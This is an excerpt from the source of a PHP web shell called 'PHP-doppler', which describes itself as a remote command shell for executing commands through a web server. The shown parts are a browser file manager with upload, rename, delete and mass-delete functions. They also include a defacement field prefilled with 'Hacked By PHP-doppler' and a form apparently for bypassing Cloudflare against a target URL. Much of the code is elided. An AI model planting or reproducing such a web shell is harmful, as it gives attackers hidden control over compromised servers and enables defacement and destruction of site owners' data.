<?php
/*
	* Shell : Haisam -Founder { PHP-doppler }-
					Made in Bangladesh
...
<html>
	<head>
		...
		<meta name="copyright" content="PHP-doppler"/>
		<title>{ PHP-doppler }</title>
		<link rel='icon' type='image/png' href='https://raw.githubusercontent.com/haisam10/sql-doppler/refs/heads/main/Black%20Baccara%20Rose.jpg'/>
			...
			<div class="container" style="margin-top: 15%">
				<div class="col-lg-6">
					<div class="form-group">
						<h1 class="text-center">{ PHP-DOPPLER }</h1>
				...
				</div><a href="https://www.facebook.com/mhmd.hythm.845513/" class="text-muted fixed-bottom">Copyright 2026 @ { php-doppler }</a><br/>
			</div>
		</center>
...
.html(filenames.join(","));
		...
		<style>
			...
			.about .card-body .img{
				position: relative;
				background: url(https://raw.githubusercontent.com/haisam10/sql-doppler/refs/heads/main/Black%20Baccara%20Rose.jpg);
		...
		<nav class="navbar static-top navbar-dark">
			...
			<div class="collapse navbar-collapse" id="info">
				<ul>
					<a href="https://www.facebook.com/mhmd.hythm.845513/" class="lain"><i class="fa fa-facebook tambah"></i></a>
					<a href="https://github.com/haisam10/sql-doppler.git" class="lain"><i class="fa fa-github tambah"></i></a>
					<a href="https://haisam10.github.io/freelancer/" class="lain"><i class="fa fa-globe tambah"></i></a>
				</ul>
			</div>
		</nav>
		<?php
		echo '
		<div class="container">
			<h1 class="text-center"><a href="https://www.facebook.com/mhmd.hythm.845513/" style="color:#ffffff;">{ PHP-doppler }</h1>
		...
		if (isset($_GET['about'])) {
			echo '<div class="card text-center bg-light about">
				<h4 class="card-header">{ PHP-doppler }</h4>
				<div class="card-body">
					<center><div class="img"></div></center>
					<p class="card-text">
                    php-doppler is a PHP-based remote command shell that can execute commands remotely through a web server. <br/>
					version: 1.0 <br/>
					Happy Hacking (^-^)
                    </p>
				</div>
				<div class="card-footer">
					<p class="card-text"><small class="text-muted">Copyright 2026 { PHP-doppler }</small></p>
				</div>
			</div><br/>';
			exit;
		}
		...
		if ($_GET['aksi'] == 'upload') {
			...
			if(isset($_POST['upload'])){
				...
				if($uplo){
					echo '<script>alert("Successfully Uploaded '.$countfiles.' File");</script>';
				}else{
		...
		*/
		if($_GET['aksi'] == 'rename') {
			...
			echo "<form method='POST'>
				...
				<input type='text' class='form-control' name='namanew' autocomplete='off' placeholder='rename_file'><br/>
		...
		*/
		if ($_GET['aksi'] == 'hapusf') {
			...
			<div class='card card-body'>
				<center><br/>
					<font color='black'>Sure to Delete : $nama</font>
				</center><br/><br/>
				<form method='POST'>
			...
			if ($_POST['ya']) {
				if(is_dir($dir)) {
					if(is_writable($dir)) {
						...
						echo "<script>window.location='?dir=".dirname($dir)."'; alert('NO".$nama."');</script>";
					}
				}
			}
		exit;
		...
		*/
		if ($_GET['aksi'] == 'rename_folder' ) {
			...
			<form method='POST'>
				<input type='text' class='form-control' name='namanew' autocomplete='off' placeholder=''><br/>
		...
		if($_GET['aksi'] == 'masdel') {
			...
			if($_POST['start']) {
				...
				echo "<form method='post'>
					...
					<textarea name='script' class='form-control' rows='5' autocomplete='off' placeholder='[Ex] Hacked By PHP-doppler'></textarea><br/>
	...
	*/
	...
	if ($_GET['aksi'] == 'bypascf') {
		echo '<form method="POST"><br>			
			...
			<div class="form-group input-group">
				<input class="form-control" type="text" name="target" placeholder=" Url">
		...
		echo '<center><div id="tab"><table class="text-white mt-1 table-hover table-responsive">
			...
			foreach($scandir as $file){
				...
				echo '<tr>
					...
					if($ext == "php") {
						echo 'https://icons.iconarchive.com/icons/papirus-team/papirus-apps/256/github-bartzaalberg-php-tester-icon.png"';
					}elseif ($ext == "html") {
						echo 'https://icons.iconarchive.com/icons/cornmanthe3rd/plex/256/Other-html-5-icon.png"';
					}elseif ($ext == "css") {
						echo 'https://icons.iconarchive.com/icons/martz90/hex/256/css-3-icon.png"';
					}elseif ($ext == "png") {
						...
						echo 'https://icons.iconarchive.com/icons/hechiceroo/mnemo/256/js-icon.png';
					}elseif ($ext == "ttf") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
					}elseif ($ext == "otf") {
						echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
					}elseif ($ext == "txt") {
						echo 'https://icons.iconarchive.com/icons/graphicloads/filetype/256/txt-icon.png';
					}elseif ($ext == "ico") {
					...
					echo '"<img src="https://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png" class="ico2">';
		...
		echo '</table></div><hr/><a href="https://www.facebook.com/mhmd.hythm.845513/" class="text-muted">Copyright 2026 { PHP-doppler }</a></center><br/>';	
